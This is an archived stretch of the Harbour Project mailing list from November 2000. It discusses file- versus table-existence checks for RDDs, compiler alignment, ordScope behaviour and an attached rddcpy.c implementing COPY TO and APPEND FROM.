on Thu, 9 Nov 2000 17:55:38 -0400

&gt;<i> FILE or fsFile are DBF file functions.
</I>
No, they are not. This is a misunderstanding on your part. They operate
on *any* filename that you pass to them. No new functions are needed,
because hb_fsFile() *is* the Harbour-level function to use from C code
to check if *any* file exists. If you want to create an index file if
it doesn't exist, you should do something like this:

    if( !hb_fsFile( &quot;myfile.cdx&quot; ) {
        // Insert code to create index file.
    }
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 16:34:01 2000
Date: Thu Nov  9 16:34:01 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>As you say, to verify a DBF/NTX/CDX file existence... None of them exist on
TOPConnect's world... And, believe me, one could implement and RDD based in
whatever the mind is capable to think. What I call &quot;physical&quot; files are part
of one (primary?) Database system, DBFs. I deal with an Interface, not with
files. What I'm saying is there should be a Database System Independent way
to verify file (table) and index existence. Do I explain myself?

Regards
Harrier

----- Original Message -----
From: &quot;David G. Holm&quot; &lt;<A HREF="mailto:dholm@jsd-llc.com">dholm@jsd-llc.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 5:04 PM
Subject: Re: [Harbour] COPY TO


&gt;<i> ** Reply to message from &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
</I>&gt;<i> on Thu, 9 Nov 2000 17:55:38 -0400
</I>&gt;<i>
</I>&gt;<i> &gt; FILE or fsFile are DBF file functions.
</I>&gt;<i>
</I>&gt;<i> No, they are not. This is a misunderstanding on your part. They operate
</I>&gt;<i> on *any* filename that you pass to them. No new functions are needed,
</I>&gt;<i> because hb_fsFile() *is* the Harbour-level function to use from C code
</I>&gt;<i> to check if *any* file exists. If you want to create an index file if
</I>&gt;<i> it doesn't exist, you should do something like this:
</I>&gt;<i>
</I>&gt;<i>     if( !hb_fsFile( &quot;myfile.cdx&quot; ) {
</I>&gt;<i>         // Insert code to create index file.
</I>&gt;<i>     }
</I>&gt;<i> --
</I>&gt;<i> David G. Holm, Set Captain and all around
</I>&gt;<i> Harbour Project Clipper Compatibility fanatic.
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 17:28:01 2000
Date: Thu Nov  9 17:28:01 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>** Reply to message from &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
on Thu, 9 Nov 2000 18:31:31 -0400

&gt;<i> As you say, to verify a DBF/NTX/CDX file existence... None of them exist on
</I>&gt;<i> TOPConnect's world...
</I>
The hb_fsFile() function can be used to check for *any* type of file,
including &quot;readme.txt&quot;, &quot;config.sys&quot;, or &quot;myfile.xyz&quot;. If it is a file,
then you can check if it exists using hb_fsFile().

&gt;<i> I deal with an Interface, not with files. What I'm saying is there 
</I>&gt;<i> should be a Database System Independent way to verify file (table) 
</I>&gt;<i> and index existence. Do I explain myself?
</I>
I think I am starting to understand: You somtimes say &quot;file&quot; when you
mean &quot;table&quot;. When you say &quot;file&quot;, people are going to think that you
are referring to a file that resides in a file system controlled by an
operating system.

So what you are really asking for are functions to check if a table
exists and to check if an index exists, where you only ask for the
table name or table and index names and the underlying RDD would
determine how to check for their existence. The NTX RDD might use FILE(
table+&quot;.dbf&quot; ) for a table check and might use FILE( table+ordbagext()
) for an index check. And TopConnect would use different methods to
check for the existence of tables and indexes.

But what would a CDX RDD do for an index check? For CDX, the index
consists of two parts: an order and a bag. So I guess there really
needs to be three checks: 1) Does the table exist; 2) Does the bag
exist; and 3) Does the order exist. Some RDDs will only need 1 and 2
(for example, NDX, NTX, and IDX). Some RDDs will only need 1 and 3 (for
example, SQL). And some RDDs will need all three (for example, CDX and
MDX).

So perhaps the functions that are needed are:

    ISTABLE( &lt;xcTableName&gt; )
    ISBAG( &lt;xcBagName&gt; )
    ISORD( &lt;xcTableName&gt;, &lt;xcIndexName&gt; [, &lt;xcBagName&gt;] )
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 18:27:02 2000
Date: Thu Nov  9 18:27:02 2000
From: Alejandro de Garate harbour@lists.harbour-project.org
Subject: [Harbour] alignment

<PRE>John Skelton wrote:

&quot;Some C compilers try to align Intel 32-bit functions on 32-bit (dword) 
boundaries.  Other compilers don't do that.  Sometimes there's a command 
line option.  A lot of Intel (&amp; AMD etc) CPUs can run faster if code is 
aligned that way.&quot;

When I was making some changes in a c module of harbour using bcc32,
I have some trouble with integer alignment because (I suspect that)
harbour build itself with 4 bytes (dword) alignment.
Please, can somebody confirm this ?
I am using Win 95, bcc32 over an Intel 233 MMX machine.
Alejandro
_________________________________________________________________________
Get Your Private, Free E-mail from MSN Hotmail at <A HREF="http://www.hotmail.com.">http://www.hotmail.com.</A>

Share information about yourself, create your own public profile at 
<A HREF="http://profiles.msn.com.">http://profiles.msn.com.</A>


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 18:34:02 2000
Date: Thu Nov  9 18:34:02 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] alignment

<PRE>** Reply to message from &quot;Alejandro de Garate&quot;
&lt;<A HREF="mailto:alex_degarate@hotmail.com">alex_degarate@hotmail.com</A>&gt; on Thu, 09 Nov 2000 23:25:53 GMT

The bcc32 versions of Harbour that are built with Borland C 5.5 do
*not* use the -a command line option, which means that the compiler
uses the default alignment, whatever that is. This means that you must
*not* use the -a command line options when building your Harbour
programs with bcc32.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 18:52:02 2000
Date: Thu Nov  9 18:52:02 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>On Thu, Nov 09, 2000 at 05:55:38PM -0400, Juan Agustin Barriga wrote:

&gt;<i>         FILE or fsFile are DBF file functions. 
</I>
FILE() has nothing to do with DBF files, it never has in CA-Clipper and it
doesn't in harbour.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 19:38:02 2000
Date: Thu Nov  9 19:38:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>Ryszard,

&quot;I think this is a bug that shouldn't be repeated in harbour&quot;

Me too. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 19:38:18 2000
Date: Thu Nov  9 19:38:18 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Brian,

Alignment could still be an issue even with the same TLIB/etc
commands, I suppose.

Another possibility is that in some cases the linker can decide to
add an extra level of indirection (pointer), so although you expect:
   call SomeFunc
what you get is:
   call *SomeData  // using C notation, in asm it's e.g. [SomeData]
and then in the data there's:
SomeData dword SomeFunc

(this being semi-fake asm, but hopefully you get the point)

That then means every call is a little slower than it would've been.

LINK does this quite often, e.g. with Win32 API (&amp; other DLL) calls.
I think the diea is that you don't notice so won't care.  Or something.

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 19:38:35 2000
Date: Thu Nov  9 19:38:35 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] fix and fix needed

<PRE>Brian,

&quot;You do have the latest CVS since yesterday morning, right?&quot;

I think so, though it does depend a bit on whose morning, whose
time-zone and whose yesterday. :-)

It's this line in ORDSCOPE():
      SELF_SETSCOPE( ( AREAP ) s_pCurrArea-&gt;pArea, (LPDBORDSCOPEINFO) &amp;sI=
nfo );
and I reckon it's actually param 2.  Normally VC++ doesn't make a
mistake about the param #, so maybe the params are being re-ordered
or something by SELF_SETSCOPE()?

I was tempted to change the (LPDBORDSCOPEINFO) but I wasn't sure what
to try instead. :-(

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 20:34:02 2000
Date: Thu Nov  9 20:34:02 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] Changelog 2000-11-09 23:30 GMT -3 (for) Harrier

<PRE>*source/rdd/rddcpy.c
    *Some fix suggested by Victor

Regards from Brazil

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 20:53:01 2000
Date: Thu Nov  9 20:53:01 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>This is a multi-part message in MIME format.

------=_NextPart_000_000D_01C04AA7.9A1F24A0
Content-Type: text/plain;
	charset=&quot;Windows-1252&quot;
Content-Transfer-Encoding: 7bit

Harrier

&gt;<i> I still have some unreleased memory blocks on my RDD Open function, I
</I>really
&gt;<i> don't know which struct variable is not being released, none xgrabbed by
</I>me,
&gt;<i> sure. Someone has an idea?
</I>
Their is some use of PHB_ITEM that is not release

See attached file for where i release this items.

Keep in mind the follow.
Items create using hb_param() cannot be release

Regards

Luiz Rafael Culik

------=_NextPart_000_000D_01C04AA7.9A1F24A0
Content-Type: application/octet-stream;
	name=&quot;rddcpy.c&quot;
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename=&quot;rddcpy.c&quot;

/*
 * $Id: rddcpy.c,v 1.4 2000/11/10 01:29:57 lculik Exp $
 */

/*
 * Harbour Project source code:
 * APPEND FROM &amp; COPY TO RDD commands
 *
 * Copyright 2000 Harrier &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
 * www - <A HREF="http://www.harbour-project.org">http://www.harbour-project.org</A>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version, with one exception:
 *
 * The exception is that if you link the Harbour Runtime Library (HRL)
 * and/or the Harbour Virtual Machine (HVM) with other files to produce
 * an executable, this does not by itself cause the resulting executable
 * to be covered by the GNU General Public License. Your use of that
 * executable is in no way restricted on account of linking the HRL
 * and/or HVM code into it.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA (or visit
 * their web site at <A HREF="http://www.gnu.org/">http://www.gnu.org/</A>).
 *
 */

// as we are in C, the code is upside down,=20
//  find __SBAPP &amp; __DBCOPY at the bottom

// create a new AREANODE and open it's Area
// I assume the file exists, else extra code must be added to create it
static LPAREANODE GetTheOtherArea( char *szDriver, char * szFileName )
{
  LPAREANODE pAreaNode;
  LPRDDNODE  pRDDNode;
  USHORT     uiRddID;
  DBOPENINFO pInfo;

  pRDDNode =3D hb_rddFindNode( szDriver, &amp;uiRddID );  // find the RDD

  if ( !pRDDNode )
  {
    hb_errRT_DBCMD( EG_ARG, EDBCMD_EVAL_BADPARAMETER, NULL, &quot;DBAPP&quot; );
    return NULL;
  }

/* get the new area node for this AREA */
  pAreaNode =3D  hb_rddNewAreaNode( pRDDNode, uiRddID );

/* Fill pInfo structure */
  memset( &amp;pInfo, 0, sizeof(DBOPENINFO) );
  pInfo.uiArea =3D uiRddID;
  pInfo.abName =3D ( BYTE * )  hb_xgrab( _POSIX_PATH_MAX + 1 );
  strcpy( ( char * ) pInfo.abName, szFileName );
  pInfo.atomAlias =3D ( BYTE * ) &quot;TMPAREA&quot;;
  pInfo.fShared =3D !hb_set.HB_SET_EXCLUSIVE;
  pInfo.fReadonly =3D FALSE;
  ( ( AREAP ) pAreaNode-&gt;pArea )-&gt;uiArea =3D uiRddID;

  if( SELF_OPEN( ( AREAP ) pAreaNode-&gt;pArea, &amp;pInfo ) =3D=3D FAILURE )
  {
    hb_errRT_DBCMD( EG_OPEN, NULL, NULL, &quot;DBAPP&quot; ); // Could not open it
    SELF_RELEASE( ( AREAP ) pAreaNode-&gt;pArea );
    hb_xfree( pAreaNode );
    return NULL;
  }
  return pAreaNode;
}

// check if the field is on the Fields Array
static BOOL IsFieldIn( char * fieldName, PHB_ITEM pFields )
{
  USHORT i, uiFields =3D ( USHORT ) hb_arrayLen( pFields );
  for ( i=3D0; i&lt;uiFields; i++ )
  {
    PHB_ITEM pField =3D pFields-&gt;item.asArray.value-&gt;pItems + i;
    if ( strcmp( fieldName, (char *)pField-&gt;item.asString.value ) =3D=3D =
0 )
      return TRUE;
  }
  return FALSE;
}

// move the Field Data between areas by name=20
static void rddMoveFields( AREAP pAreaFrom, AREAP pAreaTo, PHB_ITEM =
pFields )
{
  USHORT   i;
  PHB_ITEM fieldValue;

  fieldValue =3D hb_itemNew( NULL );
  for ( i=3D0 ; i&lt;pAreaFrom-&gt;uiFieldCount; i++ )
  {
    // list or field in the list?
    if ( !pFields || IsFieldIn( (( PHB_DYNS )(pAreaFrom-&gt;lpFields + =
i)-&gt;sym )-&gt;pSymbol-&gt;szName,  pFields ))
    {
      SELF_GETVALUE( pAreaFrom, i+1, fieldValue );
      SELF_PUTVALUE( pAreaTo, i+1, fieldValue );
    }
  }
  hb_itemRelease( fieldValue );
}

// move the records filtering if apropiate
static ERRCODE rddMoveRecords( char *cAreaFrom, char *cAreaTo, PHB_ITEM =
pFields,
                               PHB_ITEM pFor, PHB_ITEM pWhile, LONG =
lNext,
                               ULONG lRec, BOOL bRest, char *cDriver )
{
  char     * szFileName, * szDriver;
  LONG       toGo=3DlNext;
  BOOL       bFor, bWhile;
  BOOL       keepGoing=3DTRUE;
  AREAP      pAreaFrom;
  AREAP      pAreaTo;
  DBEVALINFO pEvalInfo;
  LPAREANODE pAreaRelease=3DNULL;
  LPAREANODE s_pCurrAreaSaved=3Ds_pCurrArea;

  HB_SYMBOL_UNUSED( bRest );

  if ( !s_pCurrArea )  // We need a current Area to APPEND TO or FROM
  {
     hb_errRT_DBCMD( EG_NOTABLE, EDBCMD_NOTABLE, NULL, &quot;DBAPP&quot; );
     return EG_NOTABLE;
  }

  // get the RDD Driver to use for the &quot;other&quot; Area
  if( cDriver )
     szDriver =3D cDriver;
  else
     szDriver =3D s_szDefDriver;

  if( !cAreaFrom &amp;&amp; ! cAreaTo )         // File is needed
  {
     hb_errRT_DBCMD( EG_ARG, EDBCMD_EVAL_BADPARAMETER, NULL, &quot;DBAPP&quot; );
     return EG_ARG;
  }

  if ( cAreaTo ) // it's a COPY TO
  {
    pAreaRelease =3D GetTheOtherArea( szDriver, cAreaTo );
    pAreaTo =3D pAreaRelease-&gt;pArea;
  }
  else
    pAreaTo =3D s_pCurrArea-&gt;pArea;


  if ( cAreaFrom ) // it's an APPEND FROM
  {                // make it current
    pAreaRelease =3D s_pCurrArea =3D GetTheOtherArea( szDriver, =
cAreaFrom );
    pAreaFrom =3D  pAreaRelease-&gt;pArea;=20
  }
  else
    pAreaFrom =3D s_pCurrArea-&gt;pArea;

  // or one or the other but necer none
  if ( !pAreaRelease )  // We need another Area to APPEND TO
  {
     hb_errRT_DBCMD( EG_NOTABLE, EDBCMD_NOTABLE, NULL, &quot;DBAPP&quot; );
     return EG_NOTABLE;
  }

  if ( lRec &gt; 0 )                 // only one record
    SELF_GOTO( pAreaFrom, lRec ); // go there

  // move those records assuming we are positioned on one.
  while( keepGoing )
  {
    keepGoing =3D FALSE;=20
    if( !pAreaFrom-&gt;fEof ) // until eof or an evaluation failed
    {
       if( pWhile )
          bWhile =3D hb_itemGetL( hb_vmEvalBlock( pWhile ) );
       else
          bWhile =3D TRUE;

       if( pFor )
          bFor =3D hb_itemGetL( hb_vmEvalBlock( pFor ) );
       else
          bFor =3D TRUE;

      if( bWhile &amp;&amp; bFor &amp;&amp; (!lNext || toGo &gt; 0 )) // candidate?
      {
        PHB_ITEM lpFields =3D pFields ? =
pFields-&gt;item.asArray.value-&gt;ulLen ? pFields : NULL : NULL;
        SELF_APPEND( ( AREAP ) pAreaTo, FALSE );   // put a new one on =
TO Area
        rddMoveFields( pAreaFrom, pAreaTo, lpFields ); // move the data
        if ( lRec =3D=3D 0 ) // only one record?
          keepGoing =3D TRUE;
        else
          continue;
      }
      toGo--;                     // one less to go
      SELF_SKIP( pAreaFrom, 1L ); // get the next one
    }
  }

  s_pCurrArea =3D s_pCurrAreaSaved;  // set current WorkArea to initial =
state

  // Close the File
  SELF_CLOSE( ( AREAP ) pAreaRelease-&gt;pArea );
  SELF_RELEASE( ( AREAP ) pAreaRelease-&gt;pArea );
  hb_xfree( pAreaRelease );

/* should the following be released?=20
  if ( pFields )
    hb_itemRelease( pFields );
  if ( pFor )
    hb_itemRelease( pFor );
  if ( pWhile )
    hb_itemRelease( pWhile );
*/

  return SUCCESS;
}

HB_FUNC( __DBAPP )
{
  if( ISCHAR( 1 ) )
  {
    rddMoveRecords(  hb_parc( 1 ),                /* File From */
                     NULL,                        /* TO current area */
                     hb_param( 2, HB_IT_ARRAY ),  /* Fields */
                     hb_param( 3, HB_IT_BLOCK ),  /* For */
                     hb_param( 4, HB_IT_BLOCK ),  /* While */
                     hb_parnl( 5 ),               /* Next */ /* Defaults =
to zero on bad type */
                     hb_parnl( 6 ),               /* Record */ /* =
Defaults to zero on bad type */
                     hb_parl( 7 ),                /* Rest */ /* Defaults =
to zero on bad type */
                     ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ); /* RDD */
  }
}

HB_FUNC( __DBCOPY )
{
  if( ISCHAR( 1 ) )
  {
    rddMoveRecords(  NULL,                        /* fro CURRENT Area */
                     hb_parc( 1 ),                /* To File */
                     hb_param( 2, HB_IT_ARRAY ),  /* Fields */
                     hb_param( 3, HB_IT_BLOCK ),  /* For */
                     hb_param( 4, HB_IT_BLOCK ),  /* While */
                     hb_parnl( 5 ),               /* Next */ /* Defaults =
to zero on bad type */
                     hb_parnl( 6 ),               /* Record */ /* =
Defaults to zero on bad type */
                     hb_parl( 7 ),                /* Rest */ /* Defaults =
to zero on bad type */
                     ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ); /* RDD */
  }
}



------=_NextPart_000_000D_01C04AA7.9A1F24A0--


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 02:32:02 2000
Date: Fri Nov 10 02:32:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] cannot convert parameter 1 from 'DBORDSCOPEINFO*

<PRE>Harrier and others (Victor?)

As I mentioned earlier, there was some casting in ordScope that I
didn'tunderstand.

sInfo is declared so:
   DBORDSCOPEINFO sInfo;

It was then passed to SELF_SETSCOPE cast as an OpenInfo pointer, which makes
no sense to me.
I presumed it was a cut &amp; paste typo, and changed it to DBORDSCOPEINFO, but
of course that is uselessly casting it as its current type:
       SELF_SETSCOPE( ( AREAP ) s_pCurrArea-&gt;pArea, (LPDBOPENINFO) &amp;sInfo );
changed to:
       SELF_SETSCOPE( ( AREAP ) s_pCurrArea-&gt;pArea, (LPDBORDSCOPEINFO)
&amp;sInfo );

In support of this, in rddads the &quot;SelfSetScope&quot; function was receiving it
as LPDBORDSCOPEINFO:
    static ERRCODE adsSetScope( ADSAREAP pArea, LPDBORDSCOPEINFO sInfo )

Harrier:  Had you perhaps already coded your xxxSetScope as receiving a
LPDBOPENINFO instead of LPDBORDSCOPEINFO, and would making that change set
it right?  If so, I will remove the meaningless cast in ordScope.
If not, someone needs to take me behind the woodshed and explain things to
me....

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 03:23:01 2000
Date: Fri Nov 10 03:23:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] ordScope and the Nil that was

<PRE>Remember a while back I asked about whether explicitly passing a NIL
parameter should be different than not passing the parameter at all?  The
only opinions expressed were that there should be no difference, which made
sense to me.

But I finally got around to testing it, and clip53 has a different idea.
Even though the docs say Not Passing the second parameter clears the
scope...

     Omitting &lt;expNewValue&gt; or specifying it as NIL has the special effect
of
     resetting the specified scope to its original default.  The default top
     range is the first logical record in the controlling order, and the
     default bottom range is the last logical record.

It does NOT!  It behaves like the usual get/set function.  If no second arg
is passed, it merely returns the current setting.
So----,
    ordScope(0, &quot;B&quot;)    // sets scope top to B
    ordScope(0)          // returns B and changes nothing
    ordScope(0, nil)     // returns B and clears the top scope!!

I presume we want to retain the behavior.  Does anyone NOT want me to make
it work this way?

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 04:23:01 2000
Date: Fri Nov 10 04:23:01 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] alignment

<PRE>&gt;<i>From Borland version 5.5, Borland uses same
</I>alignment as Microsoft, 4 bytes.

Antonio


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 06:24:02 2000
Date: Fri Nov 10 06:24:02 2000
From: Hannes Schmidt harbour@lists.harbour-project.org
Subject: AW: [Harbour] COPY TO

<PRE>Just a quick foreword: I have been reading this list for a while and I am
pretty impressed about the projects progress. Harbour could save my life,
because in the beginning of the nineties I heavily relied on Clipper as
*the* programming language for our in-house apps which now really suffer
from 640k-limit and incompatibilities introduced into the DOS-box by newer
versions of MS operating systems. Thanks a lot.

Well, I think the Clipper doc says, that the File() function not only looks
in the current directory but also in the directory specified by the SET PATH
TO command - if the argument does not contain a path, of course. Now, when I
tried compiling one of my apps with Harbour, it seemed that this is not true
for Harbour. Harbour looks for the file in the current directory only. Is
this true?

&gt;&gt;<i> FILE or fsFile are DBF file functions.
</I>&gt;<i>
</I>&gt;<i>No, they are not. This is a misunderstanding on your part. They operate
</I>&gt;<i>on *any* filename that you pass to them. No new functions are needed,
</I>&gt;<i>because hb_fsFile() *is* the Harbour-level function to use from C code
</I>&gt;<i>to check if *any* file exists. If you want to create an index file if
</I>&gt;<i>it doesn't exist, you should do something like this:
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 07:59:02 2000
Date: Fri Nov 10 07:59:02 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] alignment

<PRE>David,Antonio,Alejandro

&gt;<i> &gt;From Borland version 5.5, Borland uses same
</I>&gt;<i> alignment as Microsoft, 4 bytes.
</I>
I use the -a8 switch on an Pentium MMX 200 with no problem, and i think this
is a little faster then the default alingment

my CFLAGS envar is set to -OS -w- -k- -r -vi -b- -Vx  -Ve -x -a8

Regards

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 08:14:02 2000
Date: Fri Nov 10 08:14:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>I mean DBF files for ANY &quot;disk&quot; (or physical) file. Testing the existence of
a DataBase File is quite another thing. A DataBase File is an &quot;abstract&quot;
entity with some properties and methods that can be applied to it. On my RDD
I deal with ODBC, Oracle OCI, Interbase ISC or MySql API, never with &quot;files&quot;
that can be checked for existence on disk.

Regards
Harrier

----- Original Message -----
From: &quot;Dave Pearson&quot; &lt;<A HREF="mailto:davep@davep.org">davep@davep.org</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 7:49 PM
Subject: Re: [Harbour] COPY TO


&gt;<i> On Thu, Nov 09, 2000 at 05:55:38PM -0400, Juan Agustin Barriga wrote:
</I>&gt;<i>
</I>&gt;<i> &gt;         FILE or fsFile are DBF file functions.
</I>&gt;<i>
</I>&gt;<i> FILE() has nothing to do with DBF files, it never has in CA-Clipper and it
</I>&gt;<i> doesn't in harbour.
</I>&gt;<i>
</I>&gt;<i> --
</I>&gt;<i> The Harbour Project: A free software Clipper compatible compiler
</I>&gt;<i> Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
</I>&gt;<i> FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
</I>&gt;<i> My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 10:22:02 2000
Date: Fri Nov 10 10:22:02 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: AW: [Harbour] COPY TO

<PRE>** Reply to message from &quot;Hannes Schmidt&quot; &lt;<A HREF="mailto:hschmidt@cs.tu-berlin.de">hschmidt@cs.tu-berlin.de</A>&gt; on
Fri, 10 Nov 2000 12:21:59 +0100

&gt;<i> Harbour looks for the file in the current directory only. Is this true?
</I>
Yes. The Harbour implementation of FILE() is not Clipper-compatible at
this time.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 10:24:03 2000
Date: Fri Nov 10 10:24:03 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>** Reply to message from &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
on Fri, 10 Nov 2000 10:12:17 -0400

&gt;<i> A DataBase File is an &quot;abstract&quot; entity...
</I>
In database theory, a file is always a physical entity. The abstract
entity is &quot;table&quot;.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 10:31:01 2000
Date: Fri Nov 10 10:31:01 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>[Quotes rearranged to have a more logical flow]

On Fri, Nov 10, 2000 at 10:12:17AM -0400, Juan Agustin Barriga wrote:

&gt;<i> &gt; On Thu, Nov 09, 2000 at 05:55:38PM -0400, Juan Agustin Barriga wrote:
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; &gt;         FILE or fsFile are DBF file functions.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; FILE() has nothing to do with DBF files, it never has in CA-Clipper and it
</I>&gt;<i> &gt; doesn't in harbour.
</I>&gt;<i>
</I>&gt;<i> I mean DBF files for ANY &quot;disk&quot; (or physical) file. Testing the existence
</I>&gt;<i> of a DataBase File is quite another thing. A DataBase File is an
</I>&gt;<i> &quot;abstract&quot; entity with some properties and methods that can be applied to
</I>&gt;<i> it. On my RDD I deal with ODBC, Oracle OCI, Interbase ISC or MySql API,
</I>&gt;<i> never with &quot;files&quot; that can be checked for existence on disk.
</I>
You started that FILE() was a &quot;DBF file function&quot;. I was simply pointing out
that FILE() has nothing to do with DBF files. I'm not sure what bearing your
above paragraph has on this fact.

FILE() has nothing to do with RDDs, databases (either as physical or logical
entities) or anything that isn't to do with the generic testing of the
existence of a physical file.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov 10 11:02:02 2000
Date: Fri Nov 10 11:02:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>That is exactly what I meant! I think that whoever designed the RDD paradigm
kind of &quot;forgot&quot; this very useful functionality. I was surprised myself
about this missing piece when first wrote a Clipper RDD, programmers using
TOPConnect make heavy use of this to create the needed &quot;tables&quot; (sorry for
the confusion) on the fly. It would be nice to have this in Harbour (so I
can make an &quot;abstract&quot; COPY TO).

Regards
Harrier

----- Original Message -----
From: &quot;David G. Holm&quot; &lt;<A HREF="mailto:dholm@jsd-llc.com">dholm@jsd-llc.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 09, 2000 6:21 PM
Subject: Re: [Harbour] COPY TO


&gt;<i> ** Reply to message from &quot;Juan Agustin Barriga&quot; &lt;<A HREF="mailto:harrier@topconnect.cl">harrier@topconnect.cl</A>&gt;
